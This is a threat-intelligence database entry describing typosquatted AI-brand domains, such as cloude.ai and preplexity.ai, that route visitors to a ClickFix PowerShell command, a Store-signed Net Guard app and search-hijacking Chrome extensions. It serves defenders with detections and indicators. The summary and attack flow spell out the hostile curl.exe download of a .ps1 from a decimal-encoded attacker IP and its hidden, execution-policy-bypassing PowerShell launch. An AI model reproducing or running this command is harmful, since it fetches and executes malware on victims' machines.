# Island TypoPrompting turns AI-brand typos into ClickFix, Net Guard, and search hijacks

- ID: island-typoprompting-ai-typosquats-2026-11
- Reported: 2026-11-12
- AI role: ai_tool_as_lure
- Entry: https://openattacks.ai/attacks/island-typoprompting-ai-typosquats-2026-11/

## Summary
Island (Oleg Zaytsev, Nov 12, 2026) traced 186 lookalike domains across 27 AI brands, including Claude, ChatGPT, DeepSeek, Perplexity, Midjourney, ElevenLabs, and Cursor. A Nov 3, 2026 snapshot connected cloude.ai to a Windows ClickFix command and eight AI typos to an installer funnel. A Windows scan of cloude.ai went through xml.securetrackingnode.com/click to biomimicrydevtech.buzz (flow_id=81, bid about 0.0065 to 0.009) and then a random subdomain of blockchainfuturedev.buzz, which fingerprinted the browser and served a fake Cloudflare check. The recovered command was cmd /c curl.exe -fsL --ssl-no-revoke --retry 8 saving %TEMP%\W901.ps1 from 3112851459/985, then powershell -w h -nop -ep bypass -File that script. 3112851459 is 185.138.88.3 as a decimal integer. Pivoting the gate script hash found 550 scan records across 211 entry domains from April 2025 through November 2026, including lookalikes of banks, insurers, and enterprise software, plus Windows, macOS curl-to-zsh, and archive lures. Eight typos, including ckaude.ai, deepceek.com, copiot.com, elevenlebs.io, and vocie.ai, went through deezyj.com to fake Security Check pages that installed Net Guard, a Microsoft Store-signed Tauri app (publisher Myflixly App, product id 9MX3CH3BQ44Q, package family MyflixlyApp.NetGuard_k6q889pad57pt, analyzed 1.0.9.0). Island says the MSIX matches the Store hash and that buntai-sdk can change the default search engine, run JavaScript through DevTools Runtime.evaluate, and edit browser profiles. The same SDK is in Privacy Keeper 1.0.10.0 and MyFlixly Browser 1.0.10.0. The installer funnel spans 191 lander domains. preplexity.ai went to quickflashtool.com and a Chrome extension that sets the default search provider to find.flashysearches.com. It is one of 30 extensions from the same kit. Thirteen had been removed. The 17 still listed showed 972,000 declared users in total on November 3. Island says Socket's Oct 29, 2026 Searchjacked research lists 22 of the 30. An 81-domain portfolio including about 23 AI lookalikes ties to a11.click. Link anyrun-fake-ai-tools-2026-10.

## Category
adversary-use-of-ai

## Attribution
Unnamed. Island ties an 81-domain portfolio to a11.click and shared affiliate keys. No country is stated.

- Actor: Unnamed typosquat operators
- Motivation: financially-motivated
- Attributed by: Island
- Confidence: low

## AI involvement confidence
confirmed

## Scope and targeting
- Initial access: A mistyped AI domain is handed to a traffic-distribution system that selects a ClickFix command, a Store installer, or an extension page
- Victims and sectors: People trying to reach AI tools. The wider gate also used lookalikes of banks, insurers, and enterprise software. No named victim organizations.
- Regions: Multiple regions
- Region notes: Island does not name victim countries. The traffic system uses the visitor's country to pick a lure, which is not a target-region list.
- Scale and metrics: 186 lookalike domains, 27 AI brands, in the Nov 3, 2026 snapshot. 211 entry domains on the ClickFix gate. 972,000 declared users across 17 still-listed search extensions on Nov 3. Net Guard funnel about 1,437 source domains.

## Attack flow
### typo: AI-brand typo loads (access)

A lookalike such as cloude.ai or preplexity.ai is served instead of the intended AI product. A parking page hands the browser to a traffic-distribution system.

Evidence: <https://www.island.io/blog/typoprompting-from-ai-typos-to-malware>

### clickfix: Fake Cloudflare check copies a command (execution)

The Windows route copies a curl.exe download of W901.ps1 from decimal host 3112851459 and a hidden PowerShell launch.

Evidence: <https://www.island.io/blog/typoprompting-from-ai-typos-to-malware>

### netguard: Store-signed Net Guard (impact)

Other typos install the real Microsoft Store Net Guard package, whose buntai-sdk can change search settings and run DevTools scripts.

Evidence: <https://www.island.io/blog/typoprompting-from-ai-typos-to-malware>

### extension: Search-hijack extension (impact)

preplexity.ai leads to an unlisted Chrome extension that sets the default search provider to find.flashysearches.com.

Evidence: <https://www.island.io/blog/typoprompting-from-ai-typos-to-malware>

### Connections

- typo -> clickfix
- typo -> netguard
- typo -> extension

## MITRE ATLAS
- [AML.T0052](https://atlas.mitre.org/techniques/AML.T0052) Phishing — Mistyped AI domains are the lure that leads to a command, an installer, or an extension
  Evidence: <https://www.island.io/blog/typoprompting-from-ai-typos-to-malware>
- [AML.T0050](https://atlas.mitre.org/techniques/AML.T0050) Command and Scripting Interpreter — The Windows route copies a curl.exe and PowerShell command that the visitor is asked to run
  Evidence: <https://www.island.io/blog/typoprompting-from-ai-typos-to-malware>

## Prevention
Publish managed bookmarks for approved AI services. Alert when curl.exe writes a .ps1 and PowerShell starts with -w h and -ep bypass, including decimal hosts such as 3112851459. Do not treat a Microsoft Store signature as a reason to allow Net Guard package family MyflixlyApp.NetGuard_k6q889pad57pt. Enforce a managed search provider and block the extension IDs below.

## Detections
- [Suspicious Curl.EXE Download](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_curl_susp_download.yml) (sigma) — Windows process creation. curl.exe download. Matches the ClickFix command that saves W901.ps1. The decimal host 3112851459 is not a dotted IP, so a dotted-IP-only rule would miss it.
- [Potential File Transfer via Curl for Windows](https://github.com/elastic/detection-rules/blob/main/rules/windows/command_and_control_tool_transfer_via_curl.toml) (elastic) — Windows endpoint. curl.exe retrieving a remote file. Same ClickFix download, followed by powershell -w h -nop -ep bypass.
- Decimal host, Net Guard, and search override (guidance) — No cited rule encodes 3112851459, -w h -ep bypass, the Net Guard package family MyflixlyApp.NetGuard_k6q889pad57pt, or extension IDs lihnhjjcdlfdomjliljlommppbfacmbj and nlmpdomhofmjdidcghodlgneobojdjfm. A Store signature matching hash bdddb50204d6867b4bd73d9cfe93cbc98c4518342da104e4608f04e675ac6cb3 is the package Island analyzed, not a clean verdict.

## Timeline
- First seen: 2025-04
- Last updated: 2026-11-12
- 2025-04 (Island): Earliest matching records in the wider gate-kit corpus. The kit later serves Windows, macOS, and archive lures.
- 2026-11-03 (Island): Research snapshot ties cloude.ai to the Windows ClickFix command and counts 186 AI lookalikes across 27 brands. Seventeen search extensions still listed show 972,000 users.
- 2026-11-12 (Island): Oleg Zaytsev publishes TypoPrompting, including the decimal IP, Net Guard package identifiers, and the preplexity.ai extension path

## Tools
### AI tooling and models
- Lookalike domains for [Claude](https://claude.com/product/overview), [ChatGPT](https://chatgpt.com/), [DeepSeek](https://github.com/deepseek-ai), Perplexity, [Cursor](https://cursor.com/), and 22 other AI brands

### Other tooling
- curl.exe and hidden [PowerShell](https://github.com/PowerShell/PowerShell) (LOLBAS)
- Net Guard / buntai-sdk Microsoft Store package
- Chrome search-override extensions

### MagicSword projects
- [LOLBAS](https://lolbas-project.github.io)

## Source notes
Counts, the ClickFix command, decimal IP 3112851459, package identifiers, and the 972,000-user figure are from Island. The article's appendix lists more lookalikes than the IOC set below. Link anyrun-fake-ai-tools-2026-10. Historical payloads on chatlgpt.com, midj0urney.org, and deepsek.icu are included only as Island states them.

## Sources
- [TypoPrompting: From AI Typos to Malware](https://www.island.io/blog/typoprompting-from-ai-typos-to-malware) — Island
